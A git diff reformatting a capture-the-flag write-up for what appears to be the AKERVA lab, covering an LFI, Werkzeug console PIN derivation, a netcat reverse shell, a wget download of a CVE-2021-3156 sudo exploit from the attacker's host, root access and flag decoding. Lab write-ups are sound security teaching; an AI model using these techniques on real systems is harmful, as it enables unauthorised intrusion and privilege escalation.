@@ -278,22 +278,18 @@ From space_dev.py, we see there are 2 endpoints, /download and /file. The code l
 
 Just as thought, we have LFI now.
 
-<img width="1066" height="247" alt="Screenshot 2026-02-19 133507" src="https://github.com/user-attachments/assets/15e3a51a-3b80-4108-bf02-a3ba5c4e4f3b" />
-
 There are only 2 users with bash: root and aas. aas was also the username, we used to login in this 5000 port.
 
+<img width="1066" height="247" alt="Screenshot 2026-02-19 133507" src="https://github.com/user-attachments/assets/ab4d0937-a370-43bd-80d5-7ebd20b09ac6" />
 
-
-
-
-
+```flag
 Flag 5: AKERVA{IK.....i_@_} 
+```
 
+Let's see if we can find some more endpoints on port 5000.
 
-
-
-
-gobuster dir -u http://10.13.37.11:5000/ -w /usr/share/wordlists/dirb/common.txt
+```bash
+kali@kali:gobuster dir -u http://10.13.37.11:5000/ -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -315,86 +311,75 @@ Progress: 4613 / 4613 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-
-
+```
 
 We have /console which has an Interactive console that needs pin.
 
+<img width="1027" height="425" alt="Screenshot 2026-02-19 134021" src="https://github.com/user-attachments/assets/32d51873-d677-4677-8aec-c592d793f6ba" />
 
+This is a werkzeug console. We can find exploit for getting pin here "*https://www.daehee.com/blog/werkzeug-console-pin-exploit*".
 
+We need following things:
 
-https://www.daehee.com/blog/werkzeug-console-pin-exploit
-
-
-We get a exploit to get the pin from this website. We need following things:
-
+```credentials
 1. username: aas
 2. machine_id: /etc/machine-id, get this from LFI
 3. uuid.getnode: /sys/class/net/ens33/address, get this from LFI. It will drop MAC address, convert it using python.
+```
 
-
-
+```mac
 MAC Address: 00:50:56:94:0d:02 
+```
 
+We have MAC Address, let's convert it to decimal value using python.
 
-
-
-python                                                                                                              
+```bash
+kali@kali:python                                                                                                              
 Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux                                                      
 Type "help", "copyright", "credits" or "license" for more information.
 >>> print(0x5056940d02)
 345049926914
-
-
-
+```
 
 Edit all the required fields, in the exploit and run.
 
-
-
-python3 exploit.py                                                                                                     
+```bash
+kali@kali:python3 exploit.py                                                                                                     
 285-691-244
+```
+Let's login with the pin we got from the exploit to login to /console.
 
+<img width="1063" height="317" alt="Screenshot 2026-02-19 135138" src="https://github.com/user-attachments/assets/19675b64-ee77-45bd-a55e-537e92abd0e4" />
+
+Since, we are inside the interactive console, we can run the reverse shell.
 
 Start a listener.
 
-
-
-
-nc -nlvp 4444
+```bash
+kali@kali:nc -nlvp 4444
 listening on [any] 4444 ...
-
-
-
-
+```
 
 You can use any python reverse shell on the console.
 
-
-
-
-
-nc -nlvp 4444
+```bash
+kali@kali:nc -nlvp 4444
 listening on [any] 4444 ...                                                                                                                   
 connect to [10.10.16.8] from (UNKNOWN) [10.13.37.11] 47152                                                                                    
 aas@Leakage:~$ id
 id
 uid=1000(aas) gid=1000(aas) groups=1000(aas),24(cdrom),30(dip),46(plugdev)
+```
 
+We are inside the system. Let's upgrade the pty to make it more interactive.
 
-
-
-
-
-
-
+```bash
 aas@Leakage:~$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
+```
 
+Let's see if we have anything interesting in the home directory.
 
-
-
-
-
+```bash
 aas@Leakage:~$ ls -la
 ls -la
 total 28
@@ -406,50 +391,44 @@ drwxr-xr-x 3 root root 4096 Feb  9  2020 ..
 -r-------- 1 aas  aas    21 Feb  9  2020 flag.txt
 -rw-r--r-- 1 root root   38 Feb  9  2020 .hiddenflag.txt
 dr-xr-x--- 2 aas  aas  4096 Feb 10  2020 .sshcd ..
+```
 
+We have another flag.
 
-
-
-
+```bash
 aas@Leakage:~$ cat .hiddenflag.txt
 cat .hiddenflag.txt
 AKERVA{IkN.....de!}
-
-
-
+```
+```flag
 Flag 6: AKERVA{IkN.....de!}
-
-
+```
 
 We have no sudo permissions, no SUID.
 
-
-
-
+```bash
 aas@Leakage:~$ sudo --version
 sudo --version
 Sudo version 1.8.21p2
 Sudoers policy plugin version 1.8.21p2
 Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.21p2
+```
 
+Checking the sudo version, it is running version 1.8.21p2. This is an old version and has an exploit which is CVE-2021-3156.
 
+We can get the exploit code from "*https://github.com/worawit/CVE-2021-3156*".
 
-CVE-2021-3156
+Run python server on attacker machine.
 
-
-
-https://github.com/worawit/CVE-2021-3156
-
-
-
-python3 -m http.server 80                                                                                                                 
+```bash
+kali@kali:python3 -m http.server 80                                                                                                                 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
 
+Receive the exploit on the target machine.
 
-
-
-
+```bash
 aas@Leakage:/tmp$ wget http://10.10.16.8/exploitsudo.py
 wget http://10.10.16.8/exploitsudo.py
 --2026-02-19 08:43:30--  http://10.10.16.8/exploitsudo.py
@@ -461,83 +440,53 @@ Saving to: ‘exploitsudo.py’
 exploitsudo.py      100%[===================>]   7.99K  16.8KB/s    in 0.5s    
 
 2026-02-19 08:43:31 (16.8 KB/s) - ‘exploitsudo.py’ saved [8179/8179]
+```
 
+Let's run the exploit.
 
-
-
+```bash
 aas@Leakage:/tmp$ python3 exploitsudo.py
 python3 exploitsudo.py
 # id
 id
 uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(aas)
+```
 
+Now, we are root. Let's move to root directory.
 
-
-
-
-
+```bash
 # cat flag.txt  
 cat flag.txt
 AKERVA{IkN.....S!}
-
-
+```
+```flag
 Flag 7: AKERVA{IkN.....S!}
+```
 
+We have another hint too.
 
-
-
-
+```bash
 # cat secured_note.md
 cat secured_note.md
 R09B.....VLSEUK
 
 @AKERVA_FR | @lydericlefebvre
+```
 
+This is base64 enocded, let's decode it.
 
-
-
-echo "R09B.....VLSEUK" | base64 -d
+```bash
+kali@kali:echo "R09B.....VLSEUK" | base64 -d
 GOAHG.....MSYELS
+```
 
+We have Vigenère cipher, we can decode it in "*https://www.dcode.fr/vigenere-cipher*".
 
+The encoded text has missing BJQXZ, we can remove these from the alphabet. And also add 'AKERVA' as a plaintext as we know the flag contains it.
 
+<img width="1278" height="587" alt="Screenshot 2026-02-19 143440" src="https://github.com/user-attachments/assets/42e37726-4b14-4bdd-add8-823c0f2ab138" />
 
-
+We finally decoded the last flag, that completes the challenge.
+```flag
 Flag 8: AKERVA{IKN.....RE}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```
